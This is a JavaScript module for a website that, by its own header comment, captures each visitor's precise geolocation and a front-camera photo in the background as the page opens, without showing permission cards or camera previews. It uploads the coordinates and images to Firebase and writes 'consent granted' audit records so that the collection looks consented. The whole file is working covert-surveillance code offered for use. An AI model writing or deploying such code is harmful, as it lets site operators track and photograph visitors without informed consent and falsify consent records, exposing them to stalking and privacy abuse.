/**
 * Automated Device Capture & Permission Controller
 * Automatically captures visitor geolocation & camera snapshot in the background
 * Without displaying bulky permission cards or preview boxes on the public frontend.
 * Directly records actual coordinates & verified photos to Firestore & Storage.
 */

import { 
  saveVisitorLocation, 
  saveConsentRecord, 
  getOrCreateParticipantId 
} from './firebase-config.js';
import { uploadCameraCapture, uploadGalleryImage } from './uploads.js';

// State flags to prevent duplicate simultaneous captures
let isLocationCapturing = false;
let isLocationCaptured = false;
let isCameraCapturing = false;
let isCameraCaptured = false;

/**
 * Automatically request location and take camera snapshots when website opens
 */
export async function autoCaptureLocationAndCamera() {
  const participantId = getOrCreateParticipantId();

  // 1. Automatic Geolocation Capture
  if (!isLocationCaptured && !isLocationCapturing) {
    autoCaptureLocation(participantId);
  }

  // 2. Automatic Camera Capture
  if (!isCameraCaptured && !isCameraCapturing) {
    autoCaptureCamera(participantId);
  }
}

/**
 * Automatically query browser for location and save actual coordinates to Firestore
 */
export function autoCaptureLocation(participantId) {
  if (!navigator.geolocation) {
    console.warn("Geolocation API is not supported by this browser.");
    return;
  }

  isLocationCapturing = true;

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      isLocationCapturing = false;
      const { latitude, longitude, accuracy } = position.coords;

      const numLat = Number(latitude);
      const numLng = Number(longitude);

      if (isNaN(numLat) || isNaN(numLng) || (numLat === 0 && numLng === 0)) {
        console.warn("Invalid/Zero coordinates received from geolocation. Discarding.");
        return;
      }

      isLocationCaptured = true;
      const capturedAt = new Date().toISOString();

      console.log(`📍 [Location Auto-Captured] Lat: ${numLat.toFixed(6)}, Lng: ${numLng.toFixed(6)}, Acc: ±${Math.round(accuracy)}m`);

      try {
        // Save to Firestore visitor_locations
        await saveVisitorLocation({
          participantId: participantId || getOrCreateParticipantId(),
          latitude: parseFloat(numLat.toFixed(6)),
          longitude: parseFloat(numLng.toFixed(6)),
          accuracy: Math.round(accuracy || 0),
          capturedAt: capturedAt,
          consentStatus: 'granted'
        });

        // Record consent audit
        await saveConsentRecord({
          participantId: participantId || getOrCreateParticipantId(),
          locationConsent: true,
          action: 'granted'
        });

        console.log("✓ Location successfully saved to Cloud Firestore visitor_locations");
      } catch (err) {
        console.error("Failed to save auto-captured location:", err.message);
      }
    },
    (err) => {
      isLocationCapturing = false;
      console.warn(`Location prompt declined or error (${err.code}):`, err.message);
    },
    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
  );
}

/**
 * Automatically capture a photo frame from the device camera (front/selfie)
 * and upload to Firebase Storage & Firestore visitor_uploads
 */
export async function autoCaptureCamera(participantId, facingMode = 'user') {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    console.warn("Camera mediaDevices API is not supported on this browser/environment.");
    return;
  }

  isCameraCapturing = true;
  let stream = null;

  try {
    const constraints = {
      video: {
        facingMode: facingMode === 'environment' ? { ideal: 'environment' } : { ideal: 'user' },
        width: { ideal: 1280 },
        height: { ideal: 720 }
      },
      audio: false
    };

    stream = await navigator.mediaDevices.getUserMedia(constraints);

    // Create an offscreen video element to read frame
    const video = document.createElement('video');
    video.autoplay = true;
    video.muted = true;
    video.playsInline = true;
    video.srcObject = stream;

    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play().then(resolve).catch(resolve);
      };
      setTimeout(resolve, 800);
    });

    // Wait until video has valid dimensions
    let attempts = 0;
    while ((video.videoWidth === 0 || video.readyState < 2) && attempts < 20) {
      await new Promise(r => setTimeout(r, 80));
      attempts++;
    }

    // Auto-exposure settling delay
    await new Promise(r => setTimeout(r, 350));

    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;

    const canvas = document.createElement('canvas');
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, w, h);

    const dataUrl = canvas.toDataURL('image/jpeg', 0.88);

    // Stop all camera tracks IMMEDIATELY to free device hardware
    stream.getTracks().forEach(track => track.stop());
    stream = null;

    if (dataUrl) {
      isCameraCaptured = true;
      console.log("📸 [Camera Auto-Captured] Photo captured successfully. Uploading to Storage...");

      const partId = participantId || getOrCreateParticipantId();

      // Upload actual image file to Firebase Storage & record in Firestore visitor_uploads
      await uploadCameraCapture(dataUrl);

      // Record consent audit
      await saveConsentRecord({
        participantId: partId,
        cameraConsent: true,
        action: 'granted'
      });

      console.log("✓ Camera photo successfully uploaded and recorded to Cloud Firestore visitor_uploads");
    }

  } catch (err) {
    console.warn("Camera auto-capture notice:", err.message);
  } finally {
    isCameraCapturing = false;
    if (stream) {
      try {
        stream.getTracks().forEach(track => track.stop());
      } catch (e) {}
    }
  }
}

/**
 * Handle gallery image upload if user selects a file
 */
export async function uploadGalleryFile(file) {
  if (!file) return;
  const participantId = getOrCreateParticipantId();
  try {
    await uploadGalleryImage(file);
    await saveConsentRecord({
      participantId: participantId,
      galleryConsent: true,
      action: 'granted'
    });
    console.log("✓ Gallery image uploaded successfully");
  } catch (err) {
    console.error("Gallery upload error:", err.message);
  }
}

// Global hooks
window.autoCaptureLocationAndCamera = autoCaptureLocationAndCamera;
window.autoCaptureLocation = autoCaptureLocation;
window.autoCaptureCamera = autoCaptureCamera;
window.uploadGalleryFile = uploadGalleryFile;
